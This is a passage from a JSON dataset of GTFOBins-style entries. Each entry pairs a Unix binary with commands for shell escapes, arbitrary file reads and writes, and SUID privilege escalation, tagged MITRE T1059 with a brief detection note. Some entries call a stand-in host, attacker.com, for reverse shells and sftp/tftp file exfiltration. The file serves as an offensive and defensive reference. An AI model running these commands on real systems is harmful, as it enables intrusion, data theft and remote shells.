            "description": "Unix binary ssh-agent.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ssh-agent /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ssh-agent usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ssh-agent/"
                }
            ]
        },
        {
            "name": "bc",
            "description": "Unix binary bc.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "bc -s /path/to/input-file\nquit"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bc/"
                }
            ]
        },
        {
            "name": "wish",
            "description": "Unix binary wish.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "wish"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor wish usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/wish/"
                }
            ]
        },
        {
            "name": "emacs",
            "description": "Unix binary emacs.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "emacs /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "emacs /path/to/output-file\nDATA\nC-x C-s"
                },
                {
                    "label": "SHELL: ",
                    "code": "emacs -Q -nw --eval '(term \"/bin/sh\")'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor emacs usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/emacs/"
                }
            ]
        },
        {
            "name": "choom",
            "description": "Unix binary choom.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "choom -n 0 /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor choom usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/choom/"
                }
            ]
        },
        {
            "name": "rc",
            "description": "Unix binary rc.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "rc"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rc/"
                }
            ]
        },
        {
            "name": "bridge",
            "description": "Unix binary bridge.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "bridge -b /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bridge usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bridge/"
                }
            ]
        },
        {
            "name": "tmate",
            "description": "Unix binary tmate.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "tmate -c /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tmate usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tmate/"
                }
            ]
        },
        {
            "name": "msgmerge",
            "description": "Unix binary msgmerge.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "msgmerge -P /path/to/input-file /dev/null"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor msgmerge usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/msgmerge/"
                }
            ]
        },
        {
            "name": "gdb",
            "description": "Unix binary gdb.",
            "categories": [
                "file-write",
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "gdb -nx -ex 'dump value /path/to/output-file \"DATA\"' -ex quit"
                },
                {
                    "label": "INHERIT: ",
                    "code": "gdb -nx -ex 'python ... -ex quit"
                },
                {
                    "label": "SHELL: ",
                    "code": "gdb -nx -ex '!/bin/sh' -ex quit"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gdb usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gdb/"
                }
            ]
        },
        {
            "name": "psftp",
            "description": "Unix binary psftp.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "psftp\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor psftp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/psftp/"
                }
            ]
        },
        {
            "name": "nohup",
            "description": "Unix binary nohup.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "nohup /path/to/command\ncat nohup.out"
                },
                {
                    "label": "SHELL: ",
                    "code": "nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nohup usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nohup/"
                }
            ]
        },
        {
            "name": "mtr",
            "description": "Unix binary mtr.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "mtr --raw -F /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mtr usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mtr/"
                }
            ]
        },
        {
            "name": "check_log",
            "description": "Unix binary check_log.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "check_log -F /path/to/input-file -O /dev/stdout"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "check_log -F /path/to/input-file -O /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor check_log usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/check_log/"
                }
            ]
        },
        {
            "name": "more",
            "description": "Unix binary more.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "more /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "more /etc/hosts\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor more usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/more/"
                }
            ]
        },
        {
            "name": "comm",
            "description": "Unix binary comm.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "comm /path/to/input-file /dev/null"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor comm usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/comm/"
                }
            ]
        },
        {
            "name": "xxd",
            "description": "Unix binary xxd.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "xxd /path/to/input-file | xxd -r"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | xxd | xxd -r - /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xxd usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xxd/"
                }
            ]
        },
        {
            "name": "base64",
            "description": "Unix binary base64.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "base64 /path/to/input-file | base64 --decode"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor base64 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/base64/"
                }
            ]
        },
        {
            "name": "wall",
            "description": "Unix binary wall.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "wall --nobanner /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor wall usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/wall/"
                }
            ]
        },
        {
            "name": "bee",
            "description": "Unix binary bee.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "bee eval '...'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bee usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bee/"
                }
            ]
        },
        {
            "name": "socket",
            "description": "Unix binary socket.",
            "categories": [
                "reverse-shell"
            ],
            "commands": [
                {
                    "label": "BIND-SHELL: ",
                    "code": "socket -svp '/bin/sh -i' 12345"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "socket -qvp '/bin/sh -i' attacker.com 12345"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor socket usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/socket/"
                }
            ]
        },
        {
            "name": "egrep",
            "description": "Unix binary egrep.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "grep '' /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor egrep usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/egrep/"
                }
            ]
        },
        {
            "name": "luatex",
            "description": "Unix binary luatex.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "luatex -shell-escape '\\directlua{...}\\end'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor luatex usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/luatex/"
                }
            ]
        },
        {
            "name": "arj",
            "description": "Unix binary arj.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "arj a /path/to/output-file /path/to/input-file\narj p /path/to/output-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >output-file\narj a x output-file\narj e x /path/to/output-dir/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor arj usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/arj/"
                }
            ]
        },
        {
            "name": "fold",
            "description": "Unix binary fold.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "fold -w999 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor fold usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/fold/"
                }
            ]
        },
        {
            "name": "crontab",
            "description": "Unix binary crontab.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "crontab -e"
                },
                {
                    "label": "INHERIT: ",
                    "code": "crontab -e"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor crontab usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/crontab/"
                }
            ]
        },
        {
            "name": "acr",
            "description": "Unix binary acr.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nacr -r ./relative/path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor acr usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/acr/"
                }
            ]
        },
        {
            "name": "ginsh",
            "description": "Unix binary ginsh.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ginsh\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ginsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ginsh/"
                }
            ]
        },
        {
            "name": "rustfmt",
            "description": "Unix binary rustfmt.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "rustfmt /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rustfmt usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rustfmt/"
                }
            ]
        },
        {
            "name": "cowthink",
            "description": "Unix binary cowthink.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "cowthink -f /path/to/script.pl x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cowthink usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cowthink/"
                }
            ]
        },
        {
            "name": "scanmem",
            "description": "Unix binary scanmem.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "scanmem\nshell /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor scanmem usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/scanmem/"
                }
            ]
        },
        {
            "name": "tcpdump",
            "description": "Unix binary tcpdump.",
            "categories": [
                "execute",
                "file-write"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file"
                },
                {
                    "label": "COMMAND: ",
                    "code": "tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tcpdump usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tcpdump/"
                }
            ]
        },
        {
            "name": "time",
            "description": "Unix binary time.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "time /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor time usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/time/"
                }
            ]
        },
        {
            "name": "clamscan",
            "description": "Unix binary clamscan.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "touch x.yara\nclamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor clamscan usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/clamscan/"
                }
            ]
        },
        {
            "name": "dnf",
            "description": "Unix binary dnf.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "dnf install -y x-1.0-1.noarch.rpm --disablerepo=*"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dnf usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dnf/"
                }
            ]
        },
        {
            "name": "iftop",
            "description": "Unix binary iftop.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "iftop\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor iftop usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/iftop/"
                }
            ]
        },
        {
            "name": "firejail",
            "description": "Unix binary firejail.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "firejail /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor firejail usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/firejail/"
                }
            ]
        },
        {
            "name": "forge",
            "description": "Unix binary forge.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo '#!/bin/sh' >/path/to/temp-file\necho -e \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" >>/path/to/temp-file\nchmod +x /path/to/temp-file\nforge build --use /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor forge usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/forge/"
                }
            ]
        },
        {
            "name": "install",
            "description": "Unix binary install.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "install -m 6777 /path/to/input-file /path/to/output-dir/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor install usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/install/"
                }
            ]
        },
        {
            "name": "whiptail",
            "description": "Unix binary whiptail.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "whiptail --textbox --scrolltext /path/to/input-file 0 0"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor whiptail usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/whiptail/"
                }
            ]
        },
        {
            "name": "rtorrent",
            "description": "Unix binary rtorrent.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo 'execute = /bin/sh,-c,\"/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >~/.rtorrent.rc\nrtorrent"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rtorrent usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rtorrent/"
                }
            ]
        },
        {
            "name": "cut",
            "description": "Unix binary cut.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "cut -d '' -f1 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cut usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cut/"
                }
            ]
        },
        {
            "name": "msgfilter",
            "description": "Unix binary msgfilter.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "msgfilter -P -i /path/to/input-file /bin/cat"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor msgfilter usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/msgfilter/"
                }
            ]
        },
        {
            "name": "sftp",
            "description": "Unix binary sftp.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "sftp user@attacker.com\nget /path/to/input-file /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "sftp user@attacker.com\n!/bin/sh"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "sftp user@attacker.com\nput /path/to/input-file /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sftp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sftp/"
                }
            ]
        },
        {
            "name": "timeout",
            "description": "Unix binary timeout.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "timeout 0 /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor timeout usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/timeout/"
                }
            ]
        },
        {
            "name": "asterisk",
            "description": "Unix binary asterisk.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "asterisk -r\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor asterisk usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/asterisk/"
                }
            ]
        },
        {
            "name": "at",
            "description": "Unix binary at.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "echo /path/to/command | at now"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor at usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/at/"
                }
            ]
        },
        {
            "name": "sysctl",
            "description": "Unix binary sysctl.",
            "categories": [
                "execute",
                "file-read"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "sysctl 'kernel.core_pattern=|/path/to/command'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "sysctl -n \"/../../path/to/input-file\""
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sysctl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sysctl/"
                }
            ]
        },
        {
            "name": "octave",
            "description": "Unix binary octave.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "octave-cli --eval 'format none; fid = fopen(\"/path/to/input-file\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "octave-cli --eval 'fid = fopen(\"/path/to/output-file\", \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"
                },
                {
                    "label": "SHELL: ",
                    "code": "octave-cli --eval 'system(\"/bin/sh\")'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor octave usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/octave/"
                }
            ]
        },
        {
            "name": "ptx",
            "description": "Unix binary ptx.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ptx -w 999 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ptx usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ptx/"
                }
            ]
        },
        {
            "name": "pip",
            "description": "Unix binary pip.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >setup.py\npip install --break-system-packages ."
                },
                {
                    "label": "SHELL: ",
                    "code": "pip config --editor '/bin/sh -s' edit"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pip usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pip/"
                }
            ]
        },
        {
            "name": "tftp",
            "description": "Unix binary tftp.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "tftp attacker.com\nget /path/to/input-file"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "tftp attacker.com\nput /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tftp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tftp/"
                }
            ]
        },
        {
            "name": "script",
            "description": "Unix binary script.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "script -q -c '# DATA' /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "script -q /dev/null"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor script usage"
            ],
            "references": [
                {
